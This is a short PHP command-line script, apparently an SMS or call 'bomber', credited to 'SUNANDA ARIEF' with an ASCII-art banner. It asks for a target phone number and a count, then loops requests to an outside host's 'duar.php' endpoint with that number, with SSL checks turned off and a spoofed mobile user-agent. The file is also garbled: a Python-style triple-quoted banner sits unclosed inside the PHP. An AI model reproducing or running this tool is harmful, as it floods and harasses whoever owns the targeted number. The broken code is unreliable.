<?php
function curl($url, $ua = null){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_COOKIEFILE, 'cok.txt');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $ua);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	$result = curl_exec($ch);
	return $result;

}
$ua = array(
"Host: api-peking404.000webhostapp.com",
"user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SM-J500G Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36",
"accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    );
###banner###
banner_menu = """
 ██__________██
 ___█▒█________█▒█
 __█▒███____███▒█
 __█▒████████▒▒█
 __█▒████▒▒█▒▒██
 __████▒▒▒▒▒████
 ___█▒▒▒▒▒▒▒████
 __█▒▒▒▒▒▒▒▒████______█
 _██▒█▒▒▒▒▒█▒▒████__█▒█
 _█▒█●█▒▒▒█●█▒▒███_█▒▒█
 _█▒▒█▒▒▒▒▒█▒▒▒██_█▒▒█
 __█▒▒▒=▲=▒▒▒▒███_██▒█
 __██▒▒█♥█▒▒▒▒███__██▒█
 ____███▒▒▒▒████____█▒█
 ______██████________███
 _______█▒▒████______██
 _______█▒▒▒▒▒████__██
 _______█▒██▒██████▒█     SUNANDA ARIEF
 _______█▒███▒▒▒█████
 _____█▒████▒▒▒▒████
 ______█▒███▒██████__
echo "Nomor Target:  ";
$no = trim(fgets(STDIN));
echo "Jumlah:  ";
$jum = trim(fgets(STDIN));
for ($a = 0; $a < $jum; $a++){
$send = curl("https://api-peking404.000webhostapp.com/duar.php?no=$no", $ua);
print_r($send);
}
?>